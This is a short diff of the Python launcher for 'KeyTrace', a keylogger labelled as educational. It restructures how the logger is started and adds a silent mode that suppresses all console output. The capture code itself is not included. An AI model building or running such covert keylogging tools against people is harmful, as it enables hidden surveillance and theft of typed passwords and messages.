@@ -1,17 +1,20 @@
 import argparse
-from core.logger import start_keylogger
+import sys
+from core.logger import KeyLogger
+from config import config
 
-def main():
-    parser = argparse.ArgumentParser(description="KeyTrace - Educational Keylogger")
-    parser.add_argument(
-        "--silent",
-        action="store_true",
-        help="Run without printing anything to the terminal."
-    )
+def start_keylogger():
+    logger = KeyLogger()
+    logger.start()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="KeyTrace Keylogger (Educational Use Only)")
+    parser.add_argument("--silent", action="store_true", help="Run without console output")
     args = parser.parse_args()
 
-    if not args.silent:
-        print("[*] Starting KeyTrace keylogger (educational mode)...")
+    if args.silent:
+        config.SILENT_MODE = True
+        sys.stdout = open(sys.devnull, "w")  # Suppress output
 
-    start_keylogger(verbose=not args.silent)
-
+    print("[*] Starting KeyTrace keylogger (educational mode)...")
+    start_keylogger()
